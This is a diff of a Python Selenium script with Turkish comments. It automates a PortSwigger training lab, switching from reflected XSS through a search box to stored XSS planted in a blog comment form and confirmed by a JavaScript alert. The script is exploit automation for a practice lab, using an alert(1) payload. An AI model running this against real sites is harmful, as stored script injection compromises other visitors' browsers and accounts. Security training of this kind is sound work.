@@ -25,14 +25,14 @@ def get_webdriver(browser_name):
 
 def main():
     print("Cross-site scripting (XSS) - PortSwigger")
-    print("Reflected XSS into HTML context with nothing encoded")
+    print("Stored XSS into HTML context with nothing encoded")
     print("========================================")
-    print("Girdi filtrelenmeden HTML'e yerleştirildiği için, tarayıcı JavaScript kodunu çalıştırıyor.")
+    print("Yorum alanına girilen kod filtrelenmeden HTML'e yerleştirildiği için XSS çalışıyor.")
     
     # Kullanıcı girdileri
     lab_url = input("Test edilecek URL'yi girin: ")
     print("\nLütfen XSS payload'unu girin. Örneğin: <script>alert(1)</script>)")
-    payload = input("Payload girin : ")
+    payload = input("Payload girin: ")
     
     # Tarayıcı seçimi
     print("\nKullanılabilir Tarayıcılar:")
@@ -56,31 +56,71 @@ def main():
         return
 
     try:
-        # Laboratuvar sayfasını aç
+        # Lab sayfasını aç
         driver.get(lab_url)
         
-        # Arama kutusunu bul ve payload'ı gönder
-        search_box = driver.find_element(By.NAME, "search")
-        search_box.send_keys(payload)
+        # Ana sayfada blog post linkini bul ve tıkla
+        print("Blog post aranıyor...")
+        blog_link = WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.XPATH, "//a[contains(@href, '/post')]"))
+        )
+        blog_link.click()
         
-        # Arama butonunu bul ve tıkla
-        search_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
-        search_button.click()
+        # Yorum alanlarını doldur
+        print("Yorum formu doldruluyor...")
+        
+        # Yorum metni alanına payload'ı gir
+        comment_area = WebDriverWait(driver, 10).until(
+            EC.presence_of_element_located((By.NAME, "comment"))
+        )
+        comment_area.send_keys(payload)
+        
+        # İsim alanını doldur
+        name_field = driver.find_element(By.NAME, "name")
+        name_field.send_keys("Test User")
+        
+        # Email alanını doldur
+        email_field = driver.find_element(By.NAME, "email")
+        email_field.send_keys("test@example.com")
+        
+        # Website alanını doldur (opsiyonel)
+        try:
+            website_field = driver.find_element(By.NAME, "website")
+            website_field.send_keys("https://example.com")
+        except:
+            pass
+        
+        # Post comment butonunu bul ve tıkla
+        submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
+        submit_button.click()
+        
+        print("Yorum gönderildi, sayfa yenileniyor...")
+        
+        # Sayfanın yenilenmesini bekle
+        time.sleep(2)
+        
+        # Blog sayfasına geri git (XSS'i tetiklemek için)
+        driver.back()
         
         # Alert'in görünmesini bekle (maksimum 10 saniye)
         WebDriverWait(driver, 10).until(EC.alert_is_present())
         
         # Alert'i kabul et
         alert = driver.switch_to.alert
+        print(f"Alert mesajı: {alert.text}")
         alert.accept()
         
-        print(f"\n[+] XSS başarıyla tetiklendi! ({selected_browser.capitalize()} tarayıcısında)")
+        print(f"\n[+] Stored XSS başarıyla tetiklendi! ({selected_browser.capitalize()} tarayıcısında)")
         
         # Çözümün sunucu tarafından işlenmesi için kısa bekleme
         time.sleep(2)
-
+        
     except Exception as e:
         print(f"\n[!] Hata oluştu: {str(e)}")
+        print("Muhtemel sebepler:")
+        print("- URL yanlış girilmiş olabilir")
+        print("- Sayfa elementleri beklenenden farklı olabilir")
+        print("- İnternet bağlantısı sorunu olabilir")
     finally:
         # Tarayıcıyı kapat
         driver.quit()
